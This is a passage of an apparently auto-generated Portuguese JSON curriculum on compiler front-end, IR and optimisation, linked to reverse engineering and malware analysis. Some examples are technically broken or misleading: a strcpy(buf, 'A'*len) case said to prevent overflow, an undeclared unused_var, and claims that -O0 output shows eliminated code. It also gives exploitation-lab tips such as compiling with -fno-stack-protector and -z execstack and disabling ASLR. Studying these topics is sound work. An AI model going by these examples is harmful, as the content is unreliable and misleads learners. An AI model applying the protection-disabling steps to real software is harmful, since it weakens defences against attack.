                                  "learningObjective": "Aplicar algoritmos LL e LR para validar sintaxe e gerar árvores de parsing.",
                                  "commonMistakes": [
                                    "Confundir FIRST com FOLLOW; não fatorar left-recursão em LL; ignorar reduce/shift em LR."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Relacionar Análise Sintática com Controle de Fluxo em Binários",
                                  "subSteps": [
                                    "Mapeie árvores sintáticas de código fonte para grafos de controle fluxo (CFG) em binários desmontados.",
                                    "Analise como parsers constroem ASTs que guiam otimizações e geração de código objeto.",
                                    "Em segurança, use parsing reverso em binários para reconstruir estruturas de controle (loops, condicionais).",
                                    "Ferramentas como Ghidra ou IDA: explore decompilação que infere sintaxe de binários.",
                                    "Pratique identificando padrões sintáticos em assembly que correspondem a árvores de alto nível."
                                  ],
                                  "verification": "Desmonte um binário simples (ex: loop while) e desenhe a árvore sintática inferida.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Ghidra ou IDA Pro Free; Binários de teste de CTFs; Documentação de decompiladores"
                                  ],
                                  "tips": [
                                    "Comece com binários C simples; foque em blocos básicos, loops e switches."
                                  ],
                                  "learningObjective": "Conectar análise sintática front-end com análise de binários em segurança computacional.",
                                  "commonMistakes": [
                                    "Ignorar otimizações que alteram estrutura; confundir CFG sintático com grafo de fluxo."
                                  ]
                                }
                              ],
                              "practicalExample": "Usando a CFG para expressões aritméticas, parse ' ( id + id ) * id ' com um parser LL(1): construa FIRST/FOLLOW, tabela, derive a árvore mostrando precedência (* sobre +), e relacione com assembly equivalente em um binário x86 (add/sub/mul instructions em fluxo linear).",
                              "finalVerifications": [
                                "Construir corretamente uma árvore de parsing para uma string ambígua resolvida.",
                                "Implementar parser LL(1) que aceite/rejeite strings válidas.",
                                "Explicar diferenças LL vs LR com exemplo de conflito.",
                                "Inferir estrutura sintática de um snippet de assembly de binário.",
                                "Detectar e resolver ambiguidade em uma CFG personalizada.",
                                "Gerar AST manual para código C simples e mapear para grafo de fluxo."
                              ],
                              "assessmentCriteria": [
                                "Precisão na construção de FIRST/FOLLOW e tabelas de parsing (90% acerto).",
                                "Correção de árvores de parsing com hierarquia e precedência exatas.",
                                "Capacidade de identificar e resolver conflitos em parsers LL/LR.",
                                "Integração correta com análise de binários (mapeamento estrutura fonte/binário).",
                                "Explicações claras de conceitos com exemplos originais.",
                                "Detecção de erros comuns em parsing (ambiguidade, recursão)."
                              ],
                              "crossCurricularConnections": [
                                "Teoria da Computação: Autômatos e linguagens formais (pushdown automata para CFGs).",
                                "Linguística Computacional: Parsing em PNL (sintaxe natural vs programação).",
                                "Engenharia de Software: Construção de compiladores e ferramentas como ANTLR.",
                                "Segurança da Informação: Análise de malware via decompilação reversa.",
                                "Algoritmos e Estruturas: Árvores e grafos para representação de AST/CFG."
                              ],
                              "realWorldApplication": "Em segurança computacional, parsers sintáticos são usados em decompiladores (Ghidra, Hex-Rays) para reconstruir código fonte de binários maliciosos, identificando controle de fluxo ofuscado em malwares; compiladores como GCC usam análise sintática para validar e otimizar código antes da geração de binários executáveis."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.1.2.3",
                            "name": "Identificar verificações semânticas comuns",
                            "description": "Reconhecer análises de tipos, escopo de variáveis e declarações, explicando como erros semânticos impedem geração de código e impactam exploração de vulnerabilidades como buffer overflow.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os fundamentos da análise semântica",
                                  "subSteps": [
                                    "Estude a definição de análise semântica como a fase que verifica o significado lógico do código após análise léxica e sintática.",
                                    "Identifique o papel da análise semântica no front-end do compilador: construir a árvore sintática abstrata (AST) e adicionar anotações semânticas.",
                                    "Aprenda como ela detecta erros que não violam sintaxe, mas impedem execução correta.",
                                    "Revise exemplos iniciais de erros semânticos vs. sintáticos.",
                                    "Compare com fases anteriores: léxica (tokens) e sintática (estrutura)."
                                  ],
                                  "verification": "Resuma em 3 frases o que é análise semântica e suas diferenças das fases anteriores.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação de compiladores (GCC/Clang), slides sobre front-end de compiladores"
                                  ],
                                  "tips": "Use diagramas de fluxo do processo de compilação para visualizar a posição da análise semântica.",
                                  "learningObjective": "Entender o contexto e propósito da análise semântica no processo de compilação.",
                                  "commonMistakes": "Confundir análise semântica com sintática (ex: achar que 'undeclared variable' é sintaxe)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar verificações de tipos comuns",
                                  "subSteps": [
                                    "Estude verificação de compatibilidade de tipos em atribuições, operações aritméticas e chamadas de funções.",
                                    "Aprenda sobre inferência de tipos e promoção/coerção implícita em linguagens como C.",
                                    "Analise erros como atribuição de ponteiro para inteiro ou array para ponteiro sem cast.",
                                    "Pratique com exemplos: int x = 'a'; ou func(char*) chamado com int.",
                                    "Entenda como type checking previne mismatches que causam undefined behavior."
                                  ],
                                  "verification": "Liste 3 exemplos de erros de tipo e explique por que o compilador os rejeita.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Exemplos de código C com erros de tipo, ferramenta online como Godbolt para ver mensagens de erro"
                                  ],
                                  "tips": "Compile códigos com -Wall no GCC para ver warnings de tipo em tempo real.",
                                  "learningObjective": "Reconhecer e explicar verificações de tipos na análise semântica.",
                                  "commonMistakes": "Ignorar coerções implícitas como char para int, achando que são erros."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar escopo de variáveis e verificações de declarações",
                                  "subSteps": [
                                    "Defina escopo: léxico (bloco, função, global) e como resolve nomes na AST.",
                                    "Estude verificações de redeclaração, uso antes de declaração e shadowing.",
                                    "Analise erros como uso de variável fora de escopo ou múltiplas declarações no mesmo escopo.",
                                    "Pratique rastreando escopo em funções aninhadas ou com blocos {}.",
                                    "Conecte a link-time errors vs. compile-time semânticos."
                                  ],
                                  "verification": "Em um código de 20 linhas, anote escopos e identifique 2 erros potenciais.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Códigos C de exemplo com shadowing e escopo, debugger como GDB para simular"
                                  ],
                                  "tips": "Desenhe a tabela de símbolos para cada função para visualizar escopos.",
                                  "learningObjective": "Dominar verificações de escopo e declarações semânticas.",
                                  "commonMistakes": "Confundir escopo léxico com runtime (ex: achar que variáveis globais sempre acessíveis)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar impactos de erros semânticos na geração de código e vulnerabilidades",
                                  "subSteps": [
                                    "Explique como erros semânticos bloqueiam o back-end: sem AST válida, sem código objeto.",
                                    "Conecte a buffer overflow: erros de tipo/escopo em strcpy ou arrays levam a overflows se não detectados.",
                                    "Estude casos onde compilador gera código vulnerável devido a type punning ou ponteiros mal scoped.",
                                    "Simule exploração: código com char buf[10]; gets(buf); semântica permite, mas runtime falha.",
                                    "Discuta mitigação: como análises semânticas previnem exploits em binários."
                                  ],
                                  "verification": "Descreva como um erro semântico específico impede buffer overflow em análise.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Exemplos de CVEs relacionados a type errors, papers sobre semantic analysis in security"
                                  ],
                                  "tips": "Use Compiler Explorer para ver assembly gerado só após corrigir erros semânticos.",
                                  "learningObjective": "Explicar ligações entre erros semânticos, geração de código e segurança.",
                                  "commonMistakes": "Achar que todos overflows são runtime; ignorar prevenção compile-time."
                                }
                              ],
                              "practicalExample": "Analise este código C: int main() { char *buf = malloc(10); int len = 20; strcpy(buf, 'A'*len); } Erro semântico: 'A'*len é int, mas strcpy espera char*; compilador rejeita, impedindo buffer overflow. Corrija para string literal longa e explique impacto na exploração de vulnerabilidade.",
                              "finalVerifications": [
                                "Liste 5 verificações semânticas comuns com exemplos.",
                                "Explique como type mismatch impede geração de código objeto.",
                                "Identifique escopo em um código complexo de 30 linhas.",
                                "Conecte erro semântico a buffer overflow em um exemplo real.",
                                "Diferencie análise semântica de sintática em 3 casos.",
                                "Simule tabela de símbolos para uma função com variáveis locais/globais."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de pelo menos 80% das verificações semânticas em códigos teste.",
                                "Explicação clara do impacto de erros na geração de código (sem falhas lógicas).",
                                "Correta distinção entre tipos, escopo e declarações em análises.",
                                "Uso de exemplos concretos para ilustrar conexões com vulnerabilidades.",
                                "Completude da tabela de símbolos e verificações de escopo.",
                                "Capacidade de debugar e corrigir erros semânticos em <5 minutos por caso."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entendimento de ponteiros e arrays.",
                                "Segurança da Informação: Análise de vulnerabilidades como CWE-119 (Buffer Overflow).",
                                "Engenharia de Software: Desenvolvimento de compiladores e ferramentas de linting.",
                                "Análise de Binários: Reverse engineering e detecção de falhas em assembly."
                              ],
                              "realWorldApplication": "Em auditorias de segurança de software, engenheiros usam conhecimentos de verificações semânticas para identificar códigos vulneráveis em C/C++ antes da compilação, prevenindo exploits como buffer overflows em aplicações críticas como servidores web ou firmware embarcado."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.1.2.4",
                            "name": "Relacionar front-end com representação interna",
                            "description": "Mapear saídas do front-end (AST - Abstract Syntax Tree) para estruturas usadas em compiladores, preparando para geração de código intermediário em análises de malware.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Conceitos Fundamentais do Front-End e AST",
                                  "subSteps": [
                                    "Estude as fases do front-end: análise léxica (tokens), sintática (árvore de parsing) e semântica (tipos e escopo).",
                                    "Construa manualmente um AST simples para uma expressão como 'a = b + c;' usando diagramas.",
                                    "Identifique nós chave no AST: declarações, expressões, identificadores e operadores.",
                                    "Compare ASTs gerados por ferramentas como ANTLR ou Clang para código C simples.",
                                    "Anote como o AST captura estrutura semântica, ignorando detalhes de código fonte."
                                  ],
                                  "verification": "Desenhe um AST completo para um snippet de código de 5 linhas e valide contra uma ferramenta online de parsing.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Documentação de compiladores (Dragon Book), ferramentas online como AST Explorer, papel e caneta para diagramas.",
                                  "tips": "Use cores diferentes para tipos de nós no diagrama para visualização clara.",
                                  "learningObjective": "Compreender a saída do front-end como AST hierárquico e padronizado.",
                                  "commonMistakes": "Confundir tokens léxicos com nós sintáticos; ignorar anotações semânticas como tipos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Representações Internas em Compiladores",
                                  "subSteps": [
                                    "Pesquise estruturas IR comuns: árvores de sintaxe de três endereços (3AC), CFG (Control Flow Graph) e SSA (Static Single Assignment).",
                                    "Analise exemplos de IR em LLVM ou GCC para funções simples.",
                                    "Identifique como IR abstrai hardware e otimiza para back-end.",
                                    "Compare IR com AST: note a linearização e remoção de sintaxe desnecessária.",
                                    "Estude preparação para geração de código: como IR facilita otimizações."
                                  ],
                                  "verification": "Gere IR para um programa simples usando clang -emit-llvm e descreva 3 diferenças chave com o AST fonte.",
                                  "estimatedTime": "3 horas",
                                  "materials": "LLVM Tutorial, Godbolt Compiler Explorer, exemplos de código C simples.",
                                  "tips": "Use Compiler Explorer para ver IR em tempo real alterando código fonte.",
                                  "learningObjective": "Dominar estruturas internas que sucedem o front-end em compiladores.",
                                  "commonMistakes": "Assumir que IR mantém toda hierarquia do AST; confundir IR com assembly."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear AST para Representações Internas",
                                  "subSteps": [
                                    "Crie uma tabela de mapeamento: nó AST 'Assignment' -> 3AC 'x = y op z'.",
                                    "Implemente um script simples em Python para converter AST (usando ast module) em forma de 3AC.",
                                    "Trate casos especiais: loops (AST block -> CFG), condicionais e funções.",
                                    "Valide o mapeamento gerando IR manual e comparando com ferramentas reais.",
                                    "Documente transformações semânticas: resolução de escopo e inferência de tipos."
                                  ],
                                  "verification": "Converta AST de uma função com loop e if para 3AC, executando o script sem erros.",
                                  "estimatedTime": "4 horas",
                                  "materials": "Python com módulos ast e pprint, exemplos de código fonte, quadro branco.",
                                  "tips": "Comece com expressões aritméticas antes de estruturas de controle complexas.",
                                  "learningObjective": "Habilitar mapeamento preciso de saídas front-end para IR acionável.",
                                  "commonMistakes": "Perder controle de fluxo no mapeamento; ignorar temporários em 3AC."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Mapeamento no Contexto de Análise de Malware",
                                  "subSteps": [
                                    "Analise um binário malware simples com IDA Pro ou Ghidra, extraindo pseudo-código (aproximação de AST).",
                                    "Mapeie pseudo-código para IR-like para identificar padrões obfuscados.",
                                    "Simule geração de código intermediário para detectar injeções ou chamadas dinâmicas.",
                                    "Compare com amostras benignas para destacar diferenças em representações internas.",
                                    "Registre insights para engenharia reversa: como IR revela intenções maliciosas."
                                  ],
                                  "verification": "Produza um relatório de 1 página mapeando AST/IR de uma amostra malware para detecção de payload.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Ghidra ou IDA Free, amostras malware de VirusTotal (benignas primeiro), templates de relatório.",
                                  "tips": "Use amostras desofuscadas iniciais para construir confiança antes de casos reais.",
                                  "learningObjective": "Integrar mapeamento front-end/IR à análise estática de malware.",
                                  "commonMistakes": "Sobrecarregar com binários complexos; ignorar alinhamento de dados em IR."
                                }
                              ],
                              "practicalExample": "Dado o código fonte obfuscado 'int x = (a + b) * c;', gere AST: Assignment(Ident('x'), BinOp(Mul(BinOp(Add(Ident('a'), Ident('b')), Ident('c')))). Mapeie para 3AC: t1 = a + b; t2 = t1 * c; x = t2. Em malware, isso revela computação de chaves de criptografia.",
                              "finalVerifications": [
                                "Construir AST e IR manualmente para 3 snippets sem erros.",
                                "Script Python converte AST para 3AC com 90% de precisão.",
                                "Relatório de malware identifica pelo menos 2 padrões via mapeamento.",
                                "Explicar verbalmente ligação AST-IR em 5 minutos.",
                                "Comparar IR de LLVM com mapeamento manual.",
                                "Aplicar mapeamento a código com loops e validar CFG."
                              ],
                              "assessmentCriteria": [
                                "Precisão no mapeamento AST para IR (sem perda de semântica).",
                                "Profundidade nos substeps (cobertura de casos edge).",
                                "Relevância ao contexto malware (detecção de padrões).",
                                "Clareza em diagramas e tabelas de mapeamento.",
                                "Eficiência temporal (dentro dos estimates).",
                                "Criatividade em conexões práticas."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Uso de parsers em linguagens como Python (ast module).",
                                "Análise Reversa: Integração com descompiladores como Ghidra.",
                                "Segurança de Software: Detecção de vulnerabilidades em IR.",
                                "Teoria da Computação: Autômatos e gramáticas formais."
                              ],
                              "realWorldApplication": "Em ferramentas como Ghidra ou Binary Ninja, mapear AST de pseudo-código para IR acelera análise de malware, revelando lógica obfuscada para extração de C2 servers ou payloads, essencial em equipes de threat hunting."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.1.3",
                        "name": "Geração de Código Intermediário e Otimização",
                        "description": "Fases back-end: geração de código intermediário (IR, como three-address code) independente de arquitetura, seguido de otimizações locais/globais para eficiência, antes da geração de assembly e código objeto.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.1.3.1",
                            "name": "Descrever formatos de código intermediário",
                            "description": "Explicar IR comuns (TAC, SSA) e seu papel na ponte entre front-end e back-end, ilustrando com exemplos de compiladores como GCC para assembly 32/64 bits.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito de Código Intermediário (IR)",
                                  "subSteps": [
                                    "Defina o que é Código Intermediário e sua posição no pipeline de compilação.",
                                    "Identifique os objetivos principais do IR: portabilidade, otimização e ponte entre front-end e back-end.",
                                    "Compare IR com código fonte e código objeto final.",
                                    "Estude exemplos genéricos de IR em compiladores modernos.",
                                    "Analise vantagens como modularidade e facilitação de otimizações."
                                  ],
                                  "verification": "Escreva um parágrafo explicando o papel do IR e liste 3 vantagens.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação de compiladores (LLVM, GCC), slides sobre pipeline de compilação.",
                                  "tips": "Use diagramas para visualizar o fluxo front-end → IR → back-end.",
                                  "learningObjective": "Entender o IR como abstração intermediária que facilita otimizações independentes de linguagem e arquitetura.",
                                  "commonMistakes": "Confundir IR com assembly (IR é de alto nível) ou ignorar seu papel em otimizações."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar o Three-Address Code (TAC)",
                                  "subSteps": [
                                    "Descreva a estrutura do TAC: instruções com no máximo 3 operandos (ex: a = b + c).",
                                    "Estude exemplos de conversão de expressões aritméticas para TAC.",
                                    "Analise controle de fluxo em TAC (labels, goto).",
                                    "Compare TAC com código fonte em linguagens como C.",
                                    "Pratique gerando TAC manualmente para uma função simples."
                                  ],
                                  "verification": "Converta um trecho de código C em TAC equivalente e verifique semântica preservada.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Editor de texto, exemplos de livros como 'Compilers: Principles, Techniques, and Tools' (Dragon Book).",
                                  "tips": "Sempre normalize expressões para 3 endereços para evitar ambiguidades.",
                                  "learningObjective": "Dominar a representação TAC como IR linear simples para análise e otimização básica.",
                                  "commonMistakes": "Gerar instruções com mais de 3 operandos ou perder controle de fluxo."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o Static Single Assignment (SSA)",
                                  "subSteps": [
                                    "Explique o princípio SSA: cada variável é atribuída exatamente uma vez.",
                                    "Estude φ-funções para junções de controle de fluxo.",
                                    "Converta TAC para SSA e vice-versa.",
                                    "Discuta benefícios: detecção de dependências, otimizações como dead code elimination.",
                                    "Examine IRs reais como LLVM IR que usam SSA."
                                  ],
                                  "verification": "Transforme um exemplo TAC em SSA e identifique φ-funções corretas.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "LLVM tutorial, ferramentas online de visualização SSA.",
                                  "tips": "Visualize o grafo de controle de fluxo (CFG) antes de inserir φ-funções.",
                                  "learningObjective": "Compreender SSA como forma avançada de IR que simplifica análises de dados.",
                                  "commonMistakes": "Esquecer φ-funções em blocos de junção ou subestimar impacto em loops."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Ilustrar com exemplos de GCC e ponte front-end/back-end",
                                  "subSteps": [
                                    "Compile código C com GCC usando flags como -fdump-tree-gimple para ver IR (GIMPLE, SSA-like).",
                                    "Analise dumps de IR para 32/64 bits e observe diferenças arquiteturais.",
                                    "Descreva como front-end gera IR e back-end consome para assembly.",
                                    "Compare GCC RTL (Register Transfer Language) com TAC/SSA.",
                                    "Pratique rastreando uma função do C até assembly via IR."
                                  ],
                                  "verification": "Gere dump de IR de um programa GCC e anote mapeamento para assembly 32/64 bits.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "GCC instalado, código C simples, flags de dump (-S, -fdump-tree-all).",
                                  "tips": "Use objdump para assembly final e correlacione com IR dump.",
                                  "learningObjective": "Aplicar conceitos de IR/TAC/SSA em compiladores reais como GCC.",
                                  "commonMistakes": "Ignorar flags corretas ou confundir GIMPLE com assembly."
                                }
                              ],
                              "practicalExample": "Compile o código C 'int main() { int a=1, b=2; return a+b; }' com 'gcc -fdump-tree-gimple teste.c'. Analise o dump GIMPLE (SSA): identifique variáveis SSA como a_1, b_2 e φ-funções se houver fluxo. Compare com TAC equivalente: t1 = 1; t2 = 2; return t1 + t2. Gere assembly com -S para 32/64 bits e trace a ponte.",
                              "finalVerifications": [
                                "Pode definir IR, TAC e SSA com exemplos precisos?",
                                "Explica o papel da ponte front-end/back-end usando GCC?",
                                "Converte código fonte simples para TAC/SSA manualmente?",
                                "Analisa dumps de IR do GCC corretamente?",
                                "Identifica diferenças em IR para 32/64 bits?",
                                "Lista 3 otimizações facilitadas por IR?"
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual (definições corretas de IR/TAC/SSA).",
                                "Capacidade de gerar exemplos manuais acionáveis.",
                                "Análise correta de dumps GCC e correlação com assembly.",
                                "Compreensão da ponte front-end/back-end.",
                                "Identificação de benefícios e limitações.",
                                "Clareza em ilustrações práticas."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Mapeamento IR para instruções assembly 32/64 bits.",
                                "Teoria da Computação: Autômatos e linguagens formais no front-end.",
                                "Segurança da Informação: Análise de binários via decompilação de IR.",
                                "Programação: Otimizações em compiladores de linguagens modernas."
                              ],
                              "realWorldApplication": "Em segurança computacional, entender formatos de IR como TAC/SSA permite análise reversa de binários maliciosos, mapeando assembly otimizado de volta a lógica fonte via ferramentas como Ghidra ou IDA Pro, facilitando detecção de vulnerabilidades em compilados GCC para arquiteturas 32/64 bits."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.1.3.2",
                            "name": "Listar e exemplificar técnicas de otimização",
                            "description": "Detalhar otimizações como eliminação de código morto, propagação de constantes, unrolling de loops e inlining, demonstrando redução de instruções no assembly gerado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Eliminação de Código Morto e Propagação de Constantes",
                                  "subSteps": [
                                    "Estude a definição de código morto: código que nunca é executado.",
                                    "Analise propagação de constantes: substituição de variáveis por valores conhecidos em tempo de compilação.",
                                    "Escreva um exemplo simples em C com código morto e constantes.",
                                    "Compile sem otimizações e observe o assembly gerado.",
                                    "Identifique trechos eliminados ou propagados no assembly."
                                  ],
                                  "verification": "Verifique se o assembly gerado removeu variáveis não usadas e substituiu expressões por constantes.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Compilador GCC/Clang, editor de código (VS Code), documentação de flags de otimização (-O0 vs -O2)",
                                  "tips": "Use 'gcc -S -O0 arquivo.c' para gerar assembly sem otimizações.",
                                  "learningObjective": "Identificar e exemplificar como essas otimizações simplificam o código intermediário.",
                                  "commonMistakes": "Confundir código morto com código condicionalmente executado; ignorar side-effects em funções."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Unrolling de Loops e Inlining de Funções",
                                  "subSteps": [
                                    "Defina unrolling de loops: desenrolar iterações para reduzir overhead de controle.",
                                    "Explique inlining: substituir chamada de função pelo corpo da função para eliminar overhead de chamada.",
                                    "Crie um loop simples e uma função pequena em C.",
                                    "Compile com e sem otimizações (-O3 para agressivo).",
                                    "Compare o assembly: conte iterações desenroladas e ausência de chamadas jmp."
                                  ],
                                  "verification": "Confirme no assembly a expansão do loop e ausência de instruções de chamada de função.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "GCC com flags -O3, ferramenta de visualização de assembly (Godbolt.org)",
                                  "tips": "Use Compiler Explorer (godbolt.org) para comparações visuais instantâneas.",
                                  "learningObjective": "Demonstrar impacto dessas otimizações na redução de branches e chamadas.",
                                  "commonMistakes": "Aplicar unrolling em loops com dependências de dados; inlining funções grandes que aumentam tamanho do código."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Compilar e Comparar Assembly com Otimizações",
                                  "subSteps": [
                                    "Escreva um programa C integrando todas as técnicas: código morto, constantes, loop e função.",
                                    "Compile múltiplas versões: -O0, -O1, -O2, -O3.",
                                    "Gere assembly para cada (-S flag).",
                                    "Conte instruções manualmente ou com script simples.",
                                    "Documente reduções percentuais em linhas/instruções."
                                  ],
                                  "verification": "Tabela comparativa mostrando redução de pelo menos 20-50% em instruções otimizadas.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "GCC, script Python para contar linhas de assembly, planilha para métricas",
                                  "tips": "Foque em funções específicas com 'gcc -S -fverbose-asm' para anotações.",
                                  "learningObjective": "Quantificar reduções de instruções causadas por otimizações.",
                                  "commonMistakes": "Comparar assemblies de arquiteturas diferentes; ignorar otimizações de registro."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar e Exemplificar Reduções no Mundo Real",
                                  "subSteps": [
                                    "Escolha um exemplo real: função de soma em array com loop.",
                                    "Aplique otimizações e meça performance (tempo de execução).",
                                    "Analise assembly final: destaque mudanças específicas.",
                                    "Discuta trade-offs: tamanho vs velocidade.",
                                    "Crie um relatório resumindo técnicas e impactos."
                                  ],
                                  "verification": "Relatório com exemplos de before/after assembly e métricas de redução.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Timer de performance (gettimeofday), exemplos de código open-source",
                                  "tips": "Teste em hardware real para medir ciclos de CPU.",
                                  "learningObjective": "Sintetizar conhecimento aplicando múltiplas otimizações em um caso integrado.",
                                  "commonMistakes": "Atribuir reduções a otimizações erradas; negligenciar impacto em cache."
                                }
                              ],
                              "practicalExample": "Programa C: int sum(int* arr, int n) { const int factor = 2; int total = 0; for(int i=0; i<n; i++) total += arr[i] * factor; return total + unused_var; } Compile com gcc -O0 -S vs -O3 -S. Sem ot: loop com jmp, chamada implícita, unused_var. Com ot: constante propagada, loop unrolled, unused_var eliminado, ~40% menos instruções.",
                              "finalVerifications": [
                                "Liste 4 técnicas com definições corretas.",
                                "Gere assembly de exemplo mostrando redução >30% em instruções.",
                                "Explique propagação de constantes em um caso específico.",
                                "Identifique unrolling em assembly (duplicação de corpo do loop).",
                                "Meça e compare tempos de execução otimizado vs não.",
                                "Discuta inlining detectado por ausência de call/ret."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de otimizações no assembly (90%+ acerto).",
                                "Exemplos concretos com código fonte e assembly comparativos.",
                                "Quantificação correta de reduções em instruções/linhas.",
                                "Explicação clara de mecanismos (ex: como constante é foldada).",
                                "Análise de trade-offs (ex: unrolling aumenta tamanho de código).",
                                "Relatório estruturado com métricas mensuráveis."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Otimização de algoritmos em linguagens compiladas.",
                                "Análise de Binários: Entender assembly para reverse engineering em segurança.",
                                "Performance Engineering: Métricas de profiling e benchmarking.",
                                "Arquitetura de Computadores: Impacto em pipeline, cache e branches."
                              ],
                              "realWorldApplication": "Em segurança computacional, compreender otimizações auxilia na análise de binários otimizados durante reverse engineering, detectando padrões em assembly compacto para identificar vulnerabilidades em software compilado com -O2/-O3, como em malwares ou firmwares."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.1.3.3",
                            "name": "Analisar efeitos de otimizações em binários",
                            "description": "Identificar padrões otimizados em disassemblagens (usando IDA Pro ou Ghidra) de ELF/PE, relacionando com chamadas de sistema e acesso a memória para exploração de shellcodes e ROP.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente e Gerar Binários Otimizados",
                                  "subSteps": [
                                    "Instale ferramentas: GCC/Clang, IDA Pro ou Ghidra em uma VM Linux (ELF) ou Windows (PE).",
                                    "Escreva um programa C simples que realize chamadas de sistema (ex: open/read/write) e acessos de memória diretos.",
                                    "Compile o programa com níveis de otimização variados: gcc -O0 -no-pie -o prog_o0 prog.c; gcc -O2/-O3 -no-pie -o prog_o2 prog.c.",
                                    "Verifique tamanhos dos binários e remova símbolos desnecessários com strip.",
                                    "Abra os binários no disassembler para inspeção inicial."
                                  ],
                                  "verification": "Binários compilados com diferentes flags visíveis no disassembler, com seções de código comparáveis.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "GCC/Clang",
                                    "IDA Pro ou Ghidra",
                                    "VM Linux/Windows",
                                    "Editor de texto"
                                  ],
                                  "tips": "Use -fno-stack-protector e -z execstack para facilitar análises iniciais de exploração.",
                                  "learningObjective": "Preparar binários comparativos para visualizar impactos de otimizações.",
                                  "commonMistakes": [
                                    "Usar PIE por padrão (impede análise estática simples)",
                                    "Esquecer de desabilitar ASLR durante testes",
                                    "Não documentar flags exatas usadas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Disassemblar e Comparar Estruturas Básicas",
                                  "subSteps": [
                                    "Carregue ambos binários (O0 e O2/O3) no IDA Pro/Ghidra.",
                                    "Navegue pelas funções principais e compare instruções assembly linha a linha.",
                                    "Identifique diferenças iniciais: tamanho do código, número de instruções, presença de prólogos/epílogos simplificados.",
                                    "Anote mudanças em acessos de memória (ex: uso de registradores em vez de stack).",
                                    "Gere gráficos de controle de fluxo (CFG) para visualizar reestruturações."
                                  ],
                                  "verification": "Relatório comparativo com screenshots ou anotações de pelo menos 3 funções principais.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "IDA Pro ou Ghidra",
                                    "Binários gerados",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use scripts de IDA/Ghidra para automação de diffs; foque em funções com syscalls.",
                                  "learningObjective": "Discernir alterações estruturais causadas por otimizações de compilador.",
                                  "commonMistakes": [
                                    "Ignorar diferenças arquiteturais (x86 vs x64)",
                                    "Confundir otimizações com link-time opts",
                                    "Não alinhar funções equivalentes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Padrões Otimizados Específicos",
                                  "subSteps": [
                                    "Procure por inlining: funções pequenas substituídas diretamente (ex: strlen inline).",
                                    "Detecte loop unrolling e vectorization em loops de memória/syscalls repetidas.",
                                    "Identifique dead code elimination: remoção de branches não executados.",
                                    "Analise otimizações em syscalls: substituição de 'call syscall' por 'mov %rax, nr; syscall'.",
                                    "Marque padrões de memória: uso de lea/mov em vez de pushes para ROP gadgets."
                                  ],
                                  "verification": "Lista anotada de 5+ padrões identificados com offsets hexadecimais nos binários.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "IDA Pro/Ghidra com plugins de análise",
                                    "Documentação GCC Optimization docs"
                                  ],
                                  "tips": "Use 'opt-view' no GCC (-fopt-info) para correlacionar source com otimizações.",
                                  "learningObjective": "Reconhecer assinaturas assembly de otimizações comuns em binários ELF/PE.",
                                  "commonMistakes": [
